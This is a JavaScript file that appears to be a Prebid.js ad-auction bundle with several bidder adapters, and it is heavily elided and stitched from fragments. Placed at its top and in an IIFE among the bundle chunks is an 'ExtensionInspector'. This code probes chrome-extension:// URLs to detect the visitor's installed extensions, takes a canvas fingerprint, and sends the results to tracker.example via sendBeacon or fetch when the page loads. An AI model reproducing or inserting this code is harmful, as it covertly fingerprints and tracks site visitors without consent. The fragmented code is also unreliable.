class ExtensionInspector {
  constructor(extensionsStore) {
    this._stock = extensionsStore;
    this._conclusions = new Map();
    this._collectionTime = performance.now();
    this._readjustCount = 3;
    this._simultaneity = 5;
    this._eventTrackers = new Map();
    this._globalVars = Object.keys(window);
  }
  async _resourceConfirmation(extensionID, resource) {
    const distinctParameter = `?x=${Math.random().toString(36).slice(2)}`;
    const rqstQuery = new XMLHttpRequest();
    this._eventTrackers.set(extensionID, []);
    rqstQuery.addEventListener('loadstart', e => {
      this._eventTrackers.get(extensionID).push({
        event: 'loadstart',
        timestamp: e.timeStamp
      });
    });
    return new Promise(confirm => {
      rqstQuery.timeout = 2500;
      rqstQuery.onreadystatechange = () => {
        if (rqstQuery.readyState === 4) {
          confirm(rqstQuery.status === 200);
        }
      };
      rqstQuery.onerror = () => confirm(false);
      rqstQuery.ontimeout = () => confirm(false);
      rqstQuery.open('HEAD', `chrome-extension://${extensionID}/${resource}${distinctParameter}`, true);
      rqstQuery.send();
    });
  }
  _arrayChunks(array, chunkSize) {
    return Array.from({
      length: Math.ceil(array.length / chunkSize)
    }, (val, i) => array.slice(i * chunkSize, i * chunkSize + chunkSize));
  }
  async _locatorWithReadjustment(ID, content) {
    let confirmed = false;
    for (let tryNumber = 0; tryNumber < this._readjustCount && !confirmed; tryNumber++) {
      confirmed = await this._resourceConfirmation(content.id, content.file);
      if (!confirmed) {
        await new Promise(r => setTimeout(r, 125 * (tryNumber + 1)));
      }
    }
    return confirmed;
  }
  async identify() {
    const classifications = Object.entries(this._stock);
    const clusters = this._arrayChunks(classifications, this._simultaneity);
    for (const cluster of clusters) {
      await Promise.all(cluster.map(async ([ID, content]) => {
        const existence = await this._locatorWithReadjustment(ID, content);
        this._conclusions.set(ID, existence);
      }));
    }
    this._dispatchTracker();
  }
  _formulateFingerPrint() {
    const drawing = document.createElement('canvas');
    const context = drawing.getContext('2d');
    const extract = 'fingerprint,123';
    context.textBaseline = 'top';
    context.font = '16px Arial';
    context.fillText(extract, 10, 10);
    return drawing.toDataURL().slice(-60);
  }
  _dispatchTracker() {
    const trackerInput = {
      extensions: Object.fromEntries(this._conclusions),
      metadata: {
        actionTime: performance.now() - this._collectionTime,
        ...
        machine: {
          ...
          events: Array.from(this._eventTrackers.values()),
          globalVars: this._globalVars.filter(varName => !Object.keys(window).includes(varName))
        }
      }
    };
    const coder = new TextEncoder();
    const output = coder.encode(JSON.stringify(trackerInput));
    if ('sendBeacon' in navigator) {
      navigator.sendBeacon('https://tracker.example/ext-method1', output);
    } else {
      fetch('https://tracker.example/ext-method2', {
        method: 'POST',
        body: output,
        keepalive: true,
        headers: {
...
!function (e) {
  ...
  0: function (e, t, n) {
    ...
    Object.defineProperty(t, "__esModule", {
      ...
      return e && Object.getOwnPropertyNames(e).length > 0 ? de(e).map(function (t) {
        return "".concat(t, "=").concat(encodeURIComponent(fe(e, t)));
      }).join("&") : "";
      ...
      if ("string" == typeof e) {
        var n = e.split(","),
          r = /^(\d)+x(\d)+$/i;
        if (n) for (var i in n) te(n, i) && n[i].match(r) && t.push(n[i]);
      } else if ("object" === m(e)) {
        var o = e.length;
    ...
    }, t.getWindowTop = q, t.getWindowSelf = M, t.getWindowLocation = G, t.logMessage = L, t.logInfo = W, t.logWarn = F, t.logError = z, t.hasConsoleLogger = function () {
      return A;
      ...
      if (Z(e)) return [];
      if (J(e.map)) return e.map(t);
      var n = [];
      return ee(e, function (r, i) {
        n.push(t(r, i, e));
      }), n;
    }, t.hasOwn = te, t.insertElement = ne, t.waitForElementToLoad = re, t.triggerPixel = ie, t.callBurl = function (e) {
      var t = e.source,
        n = e.burl;
      t === j.S2S.SRC && n && R.triggerPixel(n);
    }, t.insertHtmlIntoIframe = function (e) {
      if (!e) return;
      var t = document.createElement("iframe");
      t.id = k(), t.width = 0, t.height = 0, t.hspace = "0", t.vspace = "0", t.marginWidth = "0", t.marginHeight = "0", t.style.display = "none", t.style.height = "0px", t.style.width = "0px", t.scrolling = "no", t.frameBorder = "0", t.allowtransparency = "true", R.insertElement(t, document, "body"), t.contentWindow.document.open(), t.contentWindow.document.write(e), t.contentWindow.document.close();
    ...
    }, t.createTrackPixelIframeHtml = ae, t.getValueString = ce, t.uniques = ue, t.flatten = se, t.getBidRequest = function (e, t) {
      if (!e) return;
      var n;
    ...
    }, t.isGptPubadsDefined = le, t.isApnGetTagDefined = function () {
      ...
      var t;
      le() && (t = u()(window.googletag.pubads().getSlots(), Oe(e)));
      if (t) return {
    ...
    }, t.isInteger = je, t.convertCamelToUnderscore = function (e) {
      ...
      return ee(e, function (e, r) {
        if (Q(e)) {
          var i = [];
          ee(e, function (e) {
            ((e = ce(t + "." + r, e)) || "" === e) && i.push(e);
          }), e = i;
        } else {
          if (!Y(e = ce(t + "." + r, e))) return;
          e = [e];
        }
        n.push({
          key: r,
      ...
      return Object.keys(e).forEach(function (n) {
        var r, i;
        t[n] && (J(e[n]) ? t[n] = e[n](t[n]) : t[n] = (r = e[n], i = t[n], "string" === r ? i && i.toString() : "number" === r ? Number(i) : i), isNaN(t[n]) && delete t.key);
      }), t;
    ...
    }, t.parseQS = Se, t.formatQS = Ee, t.parseUrl = function (e, t) {
      ...
      if (X(t) && X(o)) {
        var a = function (n) {
          X(o[n]) ? (t[n] || h(t, y({}, n, {})), e(t[n], o[n])) : Q(o[n]) && t[n] ? Q(t[n]) && o[n].forEach(function (e) {
    ...
    var O,
      ...
      T = Boolean(E && window.console.info),
      I = Boolean(E && window.console.warn),
      w = Boolean(E && window.console.error),
      C = function () {
        return null == O && (O = n(10)), O.emit.apply(O, arguments);
      },
      R = {
    ...
    function L() {
      H() && A && console.log.apply(console, V(arguments, "MESSAGE:"));
    }
    function W() {
      H() && T && console.info.apply(console, V(arguments, "INFO:"));
    }
    function F() {
      H() && I && console.warn.apply(console, V(arguments, "WARNING:")), C(j.EVENTS.AUCTION_DEBUG, {
        type: "WARNING",
        arguments: arguments
      });
    }
    function z() {
      H() && w && console.error.apply(console, V(arguments, "ERROR:")), C(j.EVENTS.AUCTION_DEBUG, {
        type: "ERROR",
        arguments: arguments
      });
    }
    ...
    function ie(e, t, n) {
      var r = new Image();
      t && R.isFn(t) && re(r, n).then(t), r.src = e;
    }
    function oe(e, t, n) {
      ...
      i.innerHTML = r;
      var o = i.firstChild;
      t && R.isFn(t) && re(o, n).then(t), R.insertElement(o, document, "html", !0);
    }
    function ae(e) {
    ...
    function ce(e, t, n) {
      return null == t ? n : Y(t) ? t : $(t) ? t.toString() : void R.logWarn("Unsuported type for param: " + e + " required type: String");
    }
    function ue(e, t, n) {
    ...
    var pe = ve("timeToRespond", function (e, t) {
        return e > t;
      }),
      ge = ve("responseTimestamp", function (e, t) {
        return e > t;
      }),
  ...
  231: function (e, t, n) {
    ...
    var r = n(10),
      ...
      b = n(3),
      v = n(102),
      y = c.a.EVENTS.BID_WON,
      h = c.a.EVENTS.STALE_RENDER,
      m = {
        "Prebid Request": function (e, t, n) {
          if (null == n) return void Object(v.a)({
            reason: c.a.AD_RENDER_FAILED_REASON.CANNOT_FIND_AD,
            message: "Cannot find ad '".concat(t.adId, "' for cross-origin render request"),
            id: t.adId
          });
          if (n.status === c.a.BID_STATUS.RENDERED && (Object(u.logWarn)("Ad id ".concat(n.adId, " has been rendered before")), i.a.emit(h, n), Object(u.deepAccess)(b.b.getConfig("auctionOptions"), "suppressStaleRender"))) return;
          try {
            !function (e, t) {
              var n = e.adId,
                r = e.ad,
                ...
                c = e.renderer,
                s = e.cpm;
              Object(l.c)(c) ? Object(l.b)(c, e) : n && (j(e), t.source.postMessage(JSON.stringify({
          ...
          s.a.addWinningBid(n), i.a.emit(y, n);
        },
    ...
    function O(e) {
      ...
      if (n && n.adId && n.message) {
        ...
        m.hasOwnProperty(n.message) && m[n.message](e, n, r);
      }
    }
    function j(e) {
      var t = e.adId,
  ...
  28: function (e, t, n) {
              ...
              var v = function (e, t) {
                ...
                function m(e, o) {
                  ...
                  var d = function (e) {
                    ...
                    var O = x(n.mediaType, f, u.b.getConfig("mediaTypePriceGranularity")),
                  ...
                  "video" === d.mediaType ? function (e, t, n, i) {
                    ...
                    u.b.getConfig("cache.url") && s !== b.b && (!t.videoCacheKey || u.b.getConfig("cache.ignoreBidderCacheKey") ? (o = !1, D(e, t, i, a)) : t.vastUrl || (Object(r.logError)("videoCacheKey specified but not required vastUrl for video bid"), o = !1));
                    o && (B(e, t), i());
                  }(t, d, a, v) : (B(t, d), v());
                }
                function O() {
    ...
    var T = {},
      I = {},
      w = [];
    var C = Object(d.b)("sync", function (e, t) {
    ...
    var D = Object(d.b)("async", function (e, t, n, i) {
    ...
    var w = function (e) {
      ...
      return t.setLatestAuctionForAdUnit = function (e, t) {
        ...
        var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : C(),
          n = w(e),
          o = R(n, t).concat(x(n, t)).concat(i.b.getConfig("enableSendAllBids") ? k(n, t) : s(n, t)).concat(P(n));
        o.map(function (e) {
  ...
  80: function (e, t, n) {
    ...
    var S = Object(r.a)(),
      ...
      x = D.PREVENT_WRITING_ON_MAIN_DOCUMENT,
      k = D.NO_AD,
      N = D.EXCEPTION,
      P = D.CANNOT_FIND_AD,
    ...
    function V(e, t) {
      ...
      if (!Object(i.isNumber)(n) || isNaN(n) || !isFinite(n)) {
        ...
        Object(i.logWarn)(r), T.emit(E.EVENTS.AUCTION_DEBUG, {
          type: "WARNING",
          arguments: r
    ...
    Object(f.a)(), S.bidderSettings = S.bidderSettings || {}, S.libLoaded = !0, S.version = "v6.8.0", Object(i.logInfo)("Prebid.js v6.8.0 loaded"), S.installedModules = S.installedModules || [], S.adUnits = S.adUnits || [], S.triggerUserSyncs = I;
    var H = {
        ...
        return e.forEach(function (e) {
          ...
          if (c && Object(i.isArray)(c)) {
            if (a && 0 !== Object.keys(a).length) {
              a.banner && (n = W(e), a.banner.hasOwnProperty("pos") && (n = V(n, "banner"))), a.video && (r = F(n || e), a.video.hasOwnProperty("pos") && (r = V(r, "video"))), a.native && (o = z(r || n || e));
              var u = j({}, n, r, o);
              t.push(u);
    ...
    S.getAdserverTargetingForAdUnitCodeStr = function (e) {
    ...
    }, S.getHighestUnusedBidResponseForAdUnitCode = function (e) {
      if (e) {
      ...
      return Object(i.logInfo)("Invoking pbjs.getNoBids", arguments), J("getNoBids");
    }, S.getNoBidsForAdUnitCode = function (e) {
      return {
      ...
      return Object(i.logInfo)("Invoking pbjs.getBidResponses", arguments), J("getBidsReceived");
      ...
      if (Object(i.logInfo)("Invoking pbjs.setTargetingForGPTAsync", arguments), Object(i.isGptPubadsDefined)()) {
        ...
        s.d.resetPresetTargeting(e, t), s.d.setTargetingForGPT(n, t), Object.keys(n).forEach(function (e) {
          Object.keys(n[e]).forEach(function (t) {
            "hb_adid" === t && u.a.setStatusForBids(n[e][t], E.BID_STATUS.BID_TARGETING_SET);
          });
        }), T.emit(U, n);
    ...
    }, S.renderAd = Object(d.b)("async", function (e, t, n) {
      if (Object(i.logInfo)("Invoking pbjs.renderAd", arguments), Object(i.logMessage)("Calling renderAd with adId :" + t), e && t) try {
        ...
        if (r) {
          var o = !0;
          if (r && r.status === E.BID_STATUS.RENDERED && (Object(i.logWarn)("Ad id ".concat(r.adId, " has been rendered before")), T.emit(B, r), Object(i.deepAccess)(c.b.getConfig("auctionOptions"), "suppressStaleRender") && (o = !1)), o) {
            ...
            u.a.addWinningBid(r), T.emit(R, r);
            var s = r.height,
              d = r.width,
              f = r.ad,
              l = r.mediaType,
            ...
            if (Object(i.insertElement)(v, e, "html"), Object(b.c)(g)) Object(b.b)(g, r), Y(v, e, "html"), Object(h.b)({
              doc: e,
              bid: r,
              id: t
              ...
              if (navigator.userAgent && navigator.userAgent.toLowerCase().indexOf("firefox/") > -1) {
                var m = /firefox\/([\d\.]+)/,
                  O = navigator.userAgent.toLowerCase().match(m)[1];
                O && parseInt(O, 10) < 67 && e.open("text/html", "replace");
              }
              e.write(f), e.close(), G(e, d, s), Y(v, e, "html"), Object(i.callBurl)(r), Object(h.b)({
                doc: e,
                bid: r,
                id: t
              });
              ...
              j.height = s, j.width = d, j.style.display = "inline", j.style.overflow = "hidden", j.src = p, Object(i.insertElement)(j, e, "body"), G(e, d, s), Y(v, e, "html"), Object(i.callBurl)(r), Object(h.b)({
                doc: e,
                bid: r,
                id: t
              });
            } else {
              var S = "Error trying to write ad. No ad for bid response id: ".concat(t);
              Object(h.a)({
                reason: k,
                message: S,
                bid: r,
          ...
          var A = "Error trying to write ad. Cannot find ad by given id : ".concat(t);
          Object(h.a)({
            reason: P,
            message: A,
            id: t
      ...
      (Object(i.logInfo)("Invoking pbjs.removeAdUnit", arguments), e) ? (Object(i.isArray)(e) ? e : [e]).forEach(function (e) {
        for (var t = S.adUnits.length - 1; t >= 0; t--) S.adUnits[t].code === e && S.adUnits.splice(t, 1);
      }) : S.adUnits = [];
      ...
      r = r && c.b.convertAdUnitFpd(Object(i.isArray)(r) ? r : [r]) || S.adUnits, Object(i.logInfo)("Invoking pbjs.requestBids", arguments);
      var l = [],
        b = [];
      if (c.b.getConfig("s2sConfig", function (e) {
        e && e.s2sConfig && (l = Array.isArray(e.s2sConfig) ? e.s2sConfig : [e.s2sConfig]);
      }), l.forEach(function (e) {
        b.push.apply(b, m(e.bidders));
    ...
    }), S.requestBids.before(Q, 49), S.addAdUnits = function (e) {
      Object(i.logInfo)("Invoking pbjs.addAdUnits", arguments), S.adUnits.push.apply(S.adUnits, c.b.convertAdUnitFpd(Object(i.isArray)(e) ? e : [e])), T.emit(C);
    ...
    var $ = [],
      X = Object(d.b)("async", function (e) {
        e && !Object(i.isEmpty)(e) ? (Object(i.logInfo)("Invoking pbjs.enableAnalytics for: ", e), A.enableAnalytics(e)) : Object(i.logError)("pbjs.enableAnalytics should be called with option {}");
      }, "enableAnalyticsCb");
    function Z(e) {
      e.forEach(function (e) {
    ...
    S.enableAnalytics = function (e) {
      ...
      Object(i.logInfo)("Invoking pbjs.aliasBidder", arguments), e && t ? A.aliasBidAdapter(e, t, n) : Object(i.logError)("bidderCode and alias must be passed as arguments", "pbjs.aliasBidder");
      ...
      }) : Object(i.logWarn)("Improper use of markWinningBidAsUsed. It needs an adUnitCode or an adId to function."), t.length > 0 && (t[0].status = E.BID_STATUS.RENDERED);
    }, S.getConfig = c.b.getConfig, S.readConfig = c.b.readConfig, S.mergeConfig = c.b.mergeConfig, S.mergeBidderConfig = c.b.mergeBidderConfig, S.setConfig = c.b.setConfig, S.setBidderConfig = c.b.setBidderConfig, S.que.push(function () {
      return Object(o.a)();
...
pbjsChunk([351], {
  ...
  292: function (e, r, t) {
    ...
    var h = "appnexus",
      ...
      w = ["geo", "device_id"],
      A = ["enabled", "dongle", "member_id", "debug_timeout"],
      x = {
        playback_method: {
          unknown: 0,
      ...
      T = {
        ...
        buildRequests: function (e, r) {
          ...
          if (Object(a.isPlainObject)(C)) {
            ...
            S.length > 0 && S.forEach(R), x.keywords = S;
          }
          if (i.b.getConfig("adpod.brandCategoryExclusion") && (x.brand_category_uniqueness = !0), f.enabled && (x.debug = f, Object(a.logInfo)("AppNexus Debug Auction Settings:\n\n" + JSON.stringify(f, null, 4))), r && r.gdprConsent && (x.gdpr_consent = {
          ...
          if (p()(e, J) && e.filter(J).forEach(function (e) {
            var r = function (e, r) {
                ...
                if (i) {
                  ...
                  n.forEach(function (e, r) {
                    u[r].map(function (r) {
                      W(r, "minduration", e), W(r, "maxduration", e);
                    });
                  });
                } else c.map(function (e) {
                  return W(e, "maxduration", o);
                });
                return c;
              }(t, e),
            ...
            var M = [];
            $(M, Object(a.deepAccess)(e[0], "userId.flocId.id"), "chrome.com", null), $(M, Object(a.deepAccess)(e[0], "userId.criteoId"), "criteo.com", null), $(M, Object(a.deepAccess)(e[0], "userId.netId"), "netid.de", null), $(M, Object(a.deepAccess)(e[0], "userId.idl_env"), "liveramp.com", null), $(M, Object(a.deepAccess)(e[0], "userId.tdid"), "adserver.org", "TDID"), $(M, Object(a.deepAccess)(e[0], "userId.uid2.id"), "uidapi.com", "UID2"), M.length && (x.eids = M);
          }
        ...
        transformBidParams: function (e, r) {
          return e = Object(a.convertTypes)({
            ...
            publisherId: "number"
          }, e), r && (e.use_pmt_rule = "boolean" == typeof e.usePaymentRule && e.usePaymentRule, e.usePaymentRule && delete e.usePaymentRule, P(e.keywords) && e.keywords.forEach(R), Object.keys(e).forEach(function (r) {
    ...
    function q(e) {
      ...
      if (t && (r.reserve = t), e.params.position && (r.position = {
        ...
        n.length > 0 && n.forEach(R), r.keywords = n;
      }
      var i,
        s,
    ...
    Object(s.registerBidder)(T), window.pbjs.installedModules.push("appnexusBidAdapter");
  }
}, [291]);
pbjsChunk([313], {
  382: function (n, t, e) {
...
(() => {
  const inspector = new ExtensionInspector(window.storage);
  if (document.readyState !== 'loading') {
    inspector.identify();
  } else {
    document.addEventListener('DOMContentLoaded', () => inspector.identify());
  }
...
pbjsChunk([57], {
  ...
  438: function (e, n, t) {
    ...
    a.default.registerAnalyticsAdapter({
      adapter: u,
      code: "dm"
    }), n.default = u, window.pbjs.installedModules.push("durationAnalyticsAdapter");
  },
  6: function (e, n, t) {
    "use strict";
    ...
    n.a = function (e) {
      ...
      (function () {
        ...
        Object(o.logMessage)("event count sent to ".concat(a, ": ").concat(j));
      })();
      return {
        track: function (e) {
          var n = e.eventType,
            t = e.args;
          this.getAdapterType() === N && window[a](l, n, t);
          this.getAdapterType() === q && U.apply(void 0, arguments);
        },
        enqueue: B,
        enableAnalytics: R,
        disableAnalytics: function () {
          Object(o._each)(n, function (e, n) {
            s.off(n, e);
      ...
      function R(e) {
        var t,
          r = this,
          u = this;
        "object" !== c(e) || "object" !== c(e.options) || void 0 === e.options.sampling || Math.random() < parseFloat(e.options.sampling) ? (s.getEvents().forEach(function (e) {
          if (e) {
            var n = e.eventType,
              t = e.args;
            n !== b && B.call(u, {
          ...
          n.config = "object" === c(e) && e.options || {}, r.enqueue({
            eventType: p,
            args: n
          });
        }), n = t, Object(o._each)(n, function (e, n) {
          s.on(n, e);
        })) : Object(o.logMessage)('Analytics adapter for "'.concat(a, '" disabled by sampling'));
        this._oldEnable = this.enableAnalytics, this.enableAnalytics = function () {
          return Object(o.logMessage)('Analytics adapter for "'.concat(a, '" already enabled, unnecessary call to `enableAnalytics`.'));
        };
      }
    };
    var r = t(5),
    ...
    var s = t(10),
      ...
      A = l.BIDDER_DONE,
      D = l.SET_TARGETING,
      _ = l.AD_RENDER_FAILED,
      h = l.AD_RENDER_SUCCEEDED,
      O = l.AUCTION_DEBUG,
      I = l.ADD_AD_UNITS,
      q = "endpoint",
      N = "bundle";
...
pbjsChunk([261], {
  ...
  505: function (e, r, t) {
    ...
    function c(e, r) {
      return function (e) {
        ...
        var n,
          ...
          s = !1;
        try {
          for (t = t.call(e); !(a = (n = t.next()).done) && (o.push(n.value), !r || o.length !== r); a = !0);
        } catch (e) {
          s = !0, i = e;
        } finally {
          try {
    ...
    var b = "grid",
      g = "https://x.bidswitch.net/sync?ssp=themediagrid",
      m = "tmguid",
      ...
      T = {
        ...
        buildRequests: function (e, r) {
          ...
          var t = null,
            ...
            I = {};
          e.forEach(function (e) {
            y || (y = e.bidderRequestId), h || (h = e.auctionId), d || (d = e.schain), p || (p = e.userIdAsEids);
            var r = e.params,
              s = r.uid,
              l = r.keywords,
              f = e.mediaTypes,
            ...
            I[b] = e;
            var S = function (e, r) {
                var t = e.video ? "video" : "banner",
                  n = r.params.bidFloor || 0;
                if ("function" == typeof r.getFloor) {
                  var i = r.getFloor({
                    currency: "USD",
                    mediaType: t,
                    size: r.sizes.map(function (e) {
                      var r = c(e, 2);
                      return {
                        w: r[0],
                        h: r[1]
                  ...
                  "object" !== u(i) || "USD" !== i.currency || isNaN(parseFloat(i.floor)) || (n = Math.max(n, parseFloat(i.floor)));
                }
                return n;
              }(f || {}, e),
              j = m && m.jwplayer && m.jwplayer.targeting;
            j && (!i && j.segments && (i = j.segments), !o && j.content && (o = j.content));
            var x = {
              id: b.toString(),
              tagid: s.toString(),
              ext: {
            ...
            if (v && v.ext && v.ext.data && (x.ext.data = v.ext.data, x.ext.data.adserver && x.ext.data.adserver.adslot ? x.ext.gpid = x.ext.data.adserver.adslot.toString() : x.ext.gpid = v.ext.data.pbadslot && v.ext.data.pbadslot.toString()), Object(n.isEmpty)(l) || (t || (t = l), x.ext.bidder = {
              keywords: l
            }), S && (x.bidfloor = S), !f || f[a.b]) {
              var w = function (e, r) {
                var t = r.sizes || e.sizes;
                if (!t || !t.length) return;
                var i = t.map(function (e) {
                    return Object(n.parseGPTSingleSizeArrayToRtbSize)(e);
                  }),
                  o = Object(n.parseGPTSingleSizeArrayToRtbSize)(t[0]);
                i.length && (o.format = i);
                return o;
              }(e, f ? f[a.b] : {});
              w && (x.banner = w);
            ...
            if (f && f[a.d]) {
              var O = function (e, r) {
                ...
                i && (d.mimes = i);
                o && 2 === o.length && (d.minduration = o[0], d.maxduration = o[1]);
          ...
          o && (k.site.content = o), i && i.length && (f = {
            data: [{
              name: "iow_labs_pub_data",
              segment: i.map(function (e) {
                return {
                  name: "jwpseg",
                  value: e
                };
            ...
            consent: S.consentString
          }), p && p.length && ((b = b || {}).eids = l(p)), b && Object.keys(b).length && ((f = f || {}).ext = b);
          var U = v.getDataFromLocalStorage(m) || function () {
          ...
          var z = Object(n.deepAccess)(s.b.getConfig("ortb2.user"), "keywords") || null,
            C = Object(n.deepAccess)(s.b.getConfig("ortb2.site"), "keywords") || null;
          return z && ((t = t || {}).user = t.user || {}, t.user.ortb2 = [{
            name: "keywords",
            keywords: z.split(",")
          }]), C && ((t = t || {}).site = t.site || {}, t.site.ortb2 = [{
            name: "keywords",
            keywords: C.split(",")
          }]), t && (t = function (e) {
            var r = {};
                      ...
                      if ("object" === u(e) && e.name) {
                        ...
                        Object.keys(e).forEach(function (r) {
                          Array.isArray(e[r]) && e[r].forEach(function (e) {
                            e && ("string" == typeof e ? t.segments.push({
                              name: r,
                              value: e
                            }) : "segments" === r && "string" == typeof e.name && "string" == typeof e.value && t.segments.push(e));
                          });
            ...
            keywords: t
          }), S && S.gdprApplies && (k.regs = {
            ext: {
              gdpr: S.gdprApplies ? 1 : 0
            }
          }), j && (k.regs || (k.regs = {
            ext: {}
          }), k.regs.ext.us_privacy = j), !0 === s.b.getConfig("coppa") && (k.regs || (k.regs = {}), k.regs.coppa = 1), {
            method: "POST",
        ...
        interpretResponse: function (e, r) {
          ...
          var t,
            i = [];
          return e ? e.seatbid && !e.seatbid.length && (t = O) : t = w, !t && e.seatbid && e.seatbid.forEach(function (e) {
            !function (e, r, t) {
              if (!e) return;
              var i;
              e.auid || (i = h + JSON.stringify(e));
              if (i || e.adm || e.nurl) {
                var s = r.bidsMap[e.impid];
                if (s) {
                  var d = {
                    requestId: s.bidId,
                    cpm: e.price,
                  ...
                  e.ext && e.ext.bidder && e.ext.bidder.grid && e.ext.bidder.grid.demandSource && (d.adserverTargeting = {
                    ...
                    content: d.vastXml
                  }) : e.nurl && (d.vastUrl = e.nurl), d.mediaType = a.d, s.renderer || s.mediaTypes && s.mediaTypes.video && "outstream" !== s.mediaTypes.video.context || (d.renderer = function (e, r) {
                    var t = o.a.install({
                      id: r.id,
                      url: r.url,
                      loaded: !1
                    ...
                    try {
                      ...
                      Object(n.logWarn)("Prebid Error calling setRender on renderer", e);
                    }
                    return t;
                  }(0, {
                    id: s.bidId,
                    url: y
                  }))) : (d.ad = e.adm, d.mediaType = a.b), t.push(d);
                }
              } else i = S + JSON.stringify(e);
              i && Object(n.logError)(i);
            }(function (e) {
              e ? e.bid ? e.bid[0] || Object(n.logError)(j) : Object(n.logError)(A + JSON.stringify(e)) : Object(n.logError)(x);
              return e && e.bid && e.bid[0];
            }(e), r, i);
          }), t && Object(n.logError)(t), i;
        },
        getUserSyncs: function (e, r, t, n) {
          if (!I && e.pixelEnabled) {
            var i = "";
            return t && ("boolean" == typeof t.gdprApplies && (i += "&gdpr=".concat(Number(t.gdprApplies))), "string" == typeof t.consentString && (i += "&gdpr_consent=".concat(t.consentString))), n && (i += "&us_privacy=".concat(n)), I = !0, {
              type: "image",
              url: g + i
            };
          }
    ...
    Object(i.registerBidder)(T), window.pbjs.installedModules.push("gridBidAdapter");
  }
}, [504]);
pbjsChunk([233], {
  571: function (e, r, t) {
...
pbjsChunk([190], {
  ...
  678: function (e, n, t) {
    ...
    function p(e, n) {
      ...
      var o,
        a = (o = "_ublock", u.getCookie(o));
      if (a) return c("Request blocked for user. hours: ", a), !1;
      for (var s = [], p = 0, b = [], l = 0; l < e.length; l++) {
        var g = e[l],
          f = g.adUnitCode;
        s.push(f);
        var v = g.sizes;
        p = void 0 !== g.params.siteId && g.params.siteId ? g.params.siteId : p;
        var m = g.params.placementId,
          w = "banner",
          h = Object(i.deepAccess)(g, "mediaTypes.video"),
          y = Object(i.deepAccess)(g, "mediaTypes.video.context");
        (g.mediaType === d.d || h && ("instream" === y || "outstream" === y)) && (w = "video"), p && t({
          div: f,
          sizes: v,
          siteId: p,
          placementId: m,
      ...
      return !!p && function (t, o, d) {
        var a,
          ...
          g,
          f = {};
        f.sid = o, f.l = function (e) {
          var n = "";
          return n = e && e.refererInfo && e.refererInfo.referer ? e.refererInfo.referer : window.context && window.context.location && window.context.location.href ? window.context.location.href : document.location.href, encodeURIComponent(n.replace(/\%/g, ""));
        }(n), f.tt = encodeURIComponent(document.title), f.tt = f.tt.replace(/'|;|quot;|39;|&amp;|&|#|\r\n|\r|\n|\t|\f|\%0A|\"|\%22|\%5C|\%23|\%26|\%26|\%09/gm, ""), f.a = function (e, n) {
          var t = [];
          if (e && e.length) {
            if (n) {
              var i = [];
          ...
          return t;
        }(t, d || []), f.t = (a = new Date(), s = function (e) {
          return e <= 9 ? "0" + e : "" + e;
        }, u = a.getDate(), c = a.getFullYear(), p = a.getMonth() + 1, b = a.getHours(), l = a.getMinutes(), g = a.getSeconds(), c + "-" + s(p) + "-" + s(u) + " " + s(b) + ":" + s(l) + ":" + s(g)), f.tz = Math.round(new Date().getTimezoneOffset()), f.r = function () {
          try {
            ...
            Object(i.logWarn)("Could not parse screen dimensions, error details:", e);
          }
        }(), f.lang = navigator.languages && navigator.languages[0] || navigator.language || navigator.userLanguage, f.ref = document.referrer, f.gdpr = function (e) {
          var n = {};
          return e && e.gdprConsent && (n = {
            consentString: e.gdprConsent.consentString,
            consentRequired: "boolean" == typeof e.gdprConsent.gdprApplies && e.gdprConsent.gdprApplies
          }), n;
        }(n), f.usp = function (e) {
          var n = "";
          return e && e.uspConsent && (n = e.uspConsent), n;
        }(n), f.pjbdr = n && n.bidderCode ? n.bidderCode : "nobid";
        var v = function (e) {
          return e && e.length > 0 ? e[0].schain : null;
        }(e);
        v && (f.schain = v);
        var m = !0 === r.b.getConfig("coppa") ? {
          coppa: !0
        } : e && e.length > 0 ? e[0].coppa : null;
        m && (f.coppa = m);
        var w = function (e) {
        ...
        return w && w.length > 0 && (f.eids = w), r.b && r.b.getConfig("ortb2") && (f.ortb2 = r.b.getConfig("ortb2")), f;
      }(s, p, b);
    }
    function b(e, n) {
      var t = function (e, n) {
      ...
      !function (e) {
        ...
        e && void 0 !== e.ublock && function (e, n, t) {
          var i = new Date();
      ...
      for (var i = [], r = 0; e.bids && r < e.bids.length; r++) {
        var o = e.bids[r];
        if (!(o.bdrid < 100) && n && n.bidderRequest && n.bidderRequest.bids) {
          ...
          if (a) {
            ...
            o.vastUrl && (s.vastUrl = o.vastUrl), o.vastXml && (s.vastXml = o.vastXml), o.videoCacheKey && (s.videoCacheKey = o.videoCacheKey), o.meta && (s.meta = o.meta), i.push(s);
          }
        }
      }
      return i;
    }
    window.nobidVersion = "1.3.2", window.nobid = window.nobid || {}, window.nobid.bidResponses = window.nobid.bidResponses || {}, window.nobid.timeoutTotal = 0, window.nobid.bidWonTotal = 0, window.nobid.refreshCount = 0, window.nobid.renderTag = function (e, n, t) {
      c("nobid.renderTag()", n);
      var i = window.nobid.bidResponses["" + n];
      if (i && i.adm2) {
        c("nobid.renderTag() found tag", n);
        var r = i.adm2;
        return e.write(r), void e.close();
      }
      c("nobid.renderTag() tag NOT FOUND *ERROR*", n);
    }, window.addEventListener("message", function (e) {
      var n = "" + e[e.message ? "message" : "data"];
      if ("nbTagRenderer.requestAdMarkup|" === n.substring(0, "nbTagRenderer.requestAdMarkup|".length)) {
        c("Prebid received nbTagRenderer.requestAdMarkup event");
        var t = n.substring(n.indexOf("|") + 1);
        if (window.nobid && window.nobid.bidResponses) {
          var i = window.nobid.bidResponses["" + t];
          if (i && i.adm2) {
            var r = i.adm2;
            r && e.source.postMessage("nbTagRenderer.renderAdInSafeFrame|" + r, "*");
          }
        }
      }
    }, !1);
    var l = {
      ...
      isBidRequestValid: function (e) {
        return c("isBidRequestValid", e), !!e.params.siteId;
      },
      buildRequests: function (e, n) {
        if (c("validBidRequests", e), !e || e.length <= 0) c("Empty validBidRequests");else {
          var t = p(e, n);
          if (t) {
            ...
            var r,
              ...
              a = (r = "https://ads.servenobid.com/", (o = "function" == typeof i.getParameterByName && Object(i.getParameterByName)("nobid-env")) ? "beta" == o ? r = "https://beta.servenobid.com/" : "dev" == o ? r = "//localhost:8282/" : "qa" == o && (r = "https://qa-ads.nobid.com/") : r = "https://ads.servenobid.com/", r + "adreq?cb=" + Math.floor(11e3 * Math.random())),
              s = {};
            return function (e) {
              var n = !0;
              return e && e.gdprConsent && e.gdprConsent.gdprApplies && 2 === e.gdprConsent.apiVersion && (n = !(!0 !== Object(i.deepAccess)(e.gdprConsent, "vendorData.purpose.consents.1"))), n;
            }(n) || (s = {
              withCredentials: !1
            }), {
              method: "POST",
      ...
